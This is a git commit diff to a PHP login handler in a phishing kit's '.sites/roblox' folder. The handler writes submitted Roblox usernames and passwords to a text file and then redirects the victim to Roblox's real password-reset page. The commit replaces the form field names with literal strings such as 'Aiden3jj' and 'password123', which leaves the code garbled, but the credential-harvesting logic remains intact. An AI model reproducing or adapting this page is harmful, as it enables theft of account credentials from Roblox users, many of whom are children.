672a2abb143f8b6f2ae756e08d90190c9fc80e4c
ahmedibnmuneef-alt <ahmedibnmuneef@gmail.com>
2026-04-18 20:17:29 +0100

    Update login.php9

--- .sites/roblox/login.php
+++ .sites/roblox/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.roblox.com/login/forgot-password-or-username/');
+file_put_contents("usernames.txt", "Roblox Username: " . $_POST['Aiden3jj'] . " Pass: " . $_POST['password123'] . "\n", FILE_APPEND);
+header('Location: https://www.roblox.com/login/forgot-password123-or-Aiden3jj/');
 exit();
 ?>
